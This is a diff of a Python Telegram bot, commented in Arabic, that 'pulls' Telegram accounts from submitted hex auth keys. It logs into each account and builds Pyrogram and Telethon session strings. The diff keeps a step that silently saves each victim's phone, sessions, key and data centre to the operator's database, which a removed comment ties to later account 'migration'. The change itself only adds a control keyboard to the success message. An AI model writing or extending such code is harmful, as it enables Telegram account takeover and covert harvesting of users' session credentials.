@@ -470,7 +470,7 @@ def log_to_channel(text, file_path=None, session_text=None):
         logging.error(f"فشل إرسال للقناة: {e}")
 
 # =========================================================
-# 📥 دالة سحب الحساب من خلال كود Hex المرسل للروبوت (بدون أزرار الإدارة)
+# 📥 دالة سحب الحساب من خلال كود Hex المرسل للروبوت (محدثة مع الكيبورد الأصلي)
 # =========================================================
 
 @bot.message_handler(func=lambda message: message.text and re.search(r'([a-fA-F0-9]{250,})\s+([1-5])', message.text))
@@ -507,10 +507,9 @@ def handle_hex_login(message):
             
             await client.disconnect()
             
-            # 🔥 حفظ الحساب بالداتا مع الهاكس والسيرفر بصمت (علشان تستخدمهم بالتهجير)
+            # 🔥 حفظ الحساب بالداتا مع الهاكس والسيرفر بصمت
             save_hex_account(message.from_user.id, phone, user_id, first_name, pyro_session, tl_session, "HEX", hex_data, dc_id)
             
-            # الرسالة العادية اللي تظهر للمستخدم (بدون أي أزرار أو هبد)
             text = (
                 f"بوت اداره الجلسات المتقدم:\n"
                 f"🛂┊ تـم سحب حساب بـنـجـاح !\n\n"
@@ -523,8 +522,12 @@ def handle_hex_login(message):
             
             bot.delete_message(message.chat.id, msg.message_id)
             
-            # إرسال الرسالة بدون InlineKeyboardMarkup خالص
-            bot.send_message(message.chat.id, text)
+            # 🔥 هنا يتم استدعاء لوحة التحكم الأصلية الخاصة بك
+            bot.send_message(
+                message.chat.id, 
+                text, 
+                reply_markup=home_keyboard(message.from_user.id)
+            )
             
         except Exception as e:
             if client and client.is_connected:
